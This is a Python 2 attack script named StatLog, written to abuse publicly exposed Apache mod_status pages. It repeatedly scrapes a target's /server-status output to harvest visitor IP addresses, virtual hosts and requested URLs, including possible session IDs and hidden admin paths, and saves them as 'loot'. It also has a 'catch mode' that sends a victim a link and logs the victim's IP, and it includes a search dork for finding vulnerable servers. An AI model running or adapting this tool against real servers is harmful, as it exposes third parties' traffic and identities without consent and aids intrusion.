#
# StatLog v0.1 - exploiting publicly accessible Apache mod_status pages
#  
# Description:
# StatLog continuously queries a target Apache server with mod_status enabled gaining information
# about the clients connecting, which vhost they're using, and what URL they are attempting to
# access. This can be used to discover hidden admin/debug portals, ongoing attacks in remote sites, botnet
# C&C, sessionIDs in URLs, and some other fun tricks.
#
# Author: Matt Howard (themdhoward[at]gmail[dot]com)
#
# Features:
#  -internal client detection - RFC 1918 address space checks
#  -"neighbor" client detection -- looks up CIDR for their netblock, matches clients
#  -catch mode - feed a link to a victim from the vulnerable site, log their IP based on the string given
#  -log all the things -- easily grep'able format. 
#
# Usage:
# python status.py -t [target domain] (-d --debug) (-r --reverse-lookup) (-c [catch string] --catch)
# - Press Ctrl+C to save results to ./status_log
# Todo:
# -threads!
# -regex apply to requests (Search for /admin, /cgi-bin/myphpsecretsauce, etc)
# -better log format..

#https://www.google.com/#gs_rn=14&gs_ri=psy-ab&tok=m46bX_5T4iUMg4yz5--Mpg&pq=inurl%3Aserver-statusintitle%3A%22apache%20status%22%20milliseconds&cp=20&gs_id=10&xhr=t&q=inurl:server-status+intitle:%22apache+status%22+milliseconds&es_nrs=true&pf=p&sclient=psy-ab&oq=inurl:server-status+intitle:%22apache+status%22+milliseconds&gs_l=&pbx=1&bav=on.2,or.r_cp.r_qf.&bvm=bv.47008514,d.eWU&fp=4f9e8116bd56070c&biw=840&bih=1260

import urllib
import time
import re
import zlib
import socket
import dns.resolver  #dnspython  -- apt-get install python-dns
import signal
import sys
import datetime
import getopt

# default values
isdebug = True
ptrfind = False  # slows down results.. fork me.
testing=False 
found_hashes = []
host_log = {}
vhost_list=[]
socket.setdefaulttimeout(1)
target = None
catch = None

# make perty
def usage(a):
	pass

def parse_args(argv):
	global target
	global isdebug
	global ptrfind
	global catch
	
	try:
		options, therest = getopt.getopt(argv[1:], 'c:dvht:pr', ['catch-string=','debug', 'version', 'help', 'target', 'reverse-lookup'])
	
		for opt, arg in options:
			if opt in ('-c', '--catch-string'):
				catch = arg
			elif opt in ('-d', '--debug'):
				isdebug = True
			elif opt in ('-v', '--version'):
				print VERSION
				sys.exit(0)
			elif opt in ('-t', '--target'):
				target = arg
				print "[+] Target defined:" + target
			elif opt in ('-h', '--help'):
				usage(argv[0])
			elif opt in ('-r', '--reverse-lookup'):
				ptrfind = True
			
	except getopt.GetoptError:
		usage(argv[0])

parse_args(sys.argv)	


# debug messasges
def debug(msg):
	if(isdebug):
		print msg

def reverseOctetOrder(ip):
	octet=re.search("([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)", ip)
	reverse = octet.groups(1)[3] + "." + octet.groups(1)[2] + "." + octet.groups(1)[1] + "." + octet.groups(1)[0]
	return reverse

# obvious
def isIP(potential):
	return re.search("^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", potential)

# is IP in range, stackoverflow copypasta
def isInNet(ip, net):
   import socket,struct
   ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
   netstr, bits = net.split('/')
   netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
   mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
   return (ipaddr & mask) == (netaddr & mask)

def areNeighbors(ip):
	if target_range and (ip.find(':') == -1):
		return isInNet(ip, target_range)
	else:
		return False

# Check for internal address space as defined by RFC1918
def isInternalAddress(ip):
	if not isIP(ip):
		try:
			ip = socket.gethostbyname(ip)
		except:
			return False # likely this will be an IPv6 address, and isnt supported yet
	if isInNet(ip, "10.0.0.0/8"):
		return True
	if isInNet(ip, "172.16.0.0/12"):
		return True
	if isInNet(ip, "192.168.0.0/16"):
		return True
	# webserver connecting to itself? stranger things have happened ;-)
	if isInNet(ip, "127.0.0.0/8"):
		return True
	return False

def lookup_whois_range(host):
	# find the IP range registered to the targets IP address via shadowserver.
	if not isIP(host):
		try:
			host = socket.gethostbyname(host)
		except:
			return False
	# reverse it for shadowserver
	reversed_host = reverseOctetOrder(host)
	for txtrecord in dns.resolver.query(reversed_host + ".origin.asn.shadowserver.org", 'TXT'):
		range_match = re.search("([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+)", txtrecord.to_text())
		if range_match:
			return range_match.groups(1)[0]
		else:
			continue
	return False # if we got here, there is no range, it happens.

print "Press Ctrl + C to save results to ./status_log"

# find neighbors
target_range = lookup_whois_range(target)
if target_range:
	print "Target range identified: " + target_range
else:
	print "Target range could not be determined.. Running against yourself?"

# save to a nice grep'able format for later user.
def clean_up_nicely():
	fh = open('status_log', 'a')
	fh.write("\n==================" + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "==================")
	for host, requests in host_log.iteritems():
		fh.write(host + ":")
		for request in requests:
			fh.write(request + "|*|")
		fh.write("\n")
	print "Loot is ours!"
	fh.close()
		
def sigint_handler(signal, frame):
	print 'Ctrl+C caught, saving our loot'
	clean_up_nicely()
	sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)
if catch:
	print "CATCH MODE ENABLED! Feed that mouse with the following link:\n"
	print "http://" + target + "/" + catch
while 1:
	time.sleep(1)
	try:
		fd = urllib.urlopen("http://" + target + "/server-status?notable")
	except:
		print "URLopen failed"
		continue
	html = fd.read()
	fd.close()
	lines = html.split("\n")

	for line in lines:
		match_ip = None
		match_request = None
		match_ip = re.search("<i>([^\{]+) \{", line)
		match_request = re.search("\{([^\}]+)}</i>", line)
		match_vhost = re.search("<b>\[(.*)\]</b>", line)
		
		if match_ip and match_request:
			requester = match_ip.groups(1)[0]
			request = match_request.groups(1)[0]
			vhost = match_vhost.groups(1)[0]
			hash = zlib.crc32(requester+request+vhost)
			# catch mode! find that sucker
			if(catch):
				match_catch = re.search(catch, request)
				if match_catch:
					#if match_request.groups(1)[0] is catch:
						ptr = "?"
						try:
							socket.gethostbyaddr(requester)[0]
						except:
							pass
						print "CAUGHT THE MOUSE: " + requester + "(" + ptr + ")"
			# if we already have the request - requester pair, dont bother
			if not hash in found_hashes and not catch:
				# If it's a new host, do some checks: make fireworks.
				if not requester in host_log:
					host_log[requester] = []
					debug ("[!] new host: " + requester)
					if (ptrfind):
						try:
							ptr = socket.gethostbyaddr(requester)[0]
						except:
							ptr = "Reverse DNS failed"
						debug ("[!] PTR record: " + ptr)
						host_log[requester].append('(' + ptr + '):')
					
					if isInternalAddress(requester):
						debug ("[!!!] INTERNAL HOST DETECTED:")
						debug ("[!!] IP: " + requester)
						debug ("[!!] Request: " + request)
						host_log[requester].append('!INTERNAL!')
					if areNeighbors(requester):
						debug ("[!!!] NEIGHBOR HOST DETECTED:")
						debug ("[!!] IP: " + requester)
						debug ("[!!] Request: " + request)
						host_log[requester].append('!NEIGHBOR!')
				if not vhost in vhost_list:
					vhost_list.append(vhost)
					if(len(vhost_list) == 2):
						debug ("[!!] Multi-homed web server detected!")
				found_hashes.append(hash)
				debug ("[+] IP: " + requester)
				debug ("[+] Request: " + request)
				debug ("[+] Vhost: " + vhost)
				debug ("[+] Request hash:" + str(hash))
				host_log[requester].append(vhost + "\\" + request)
				
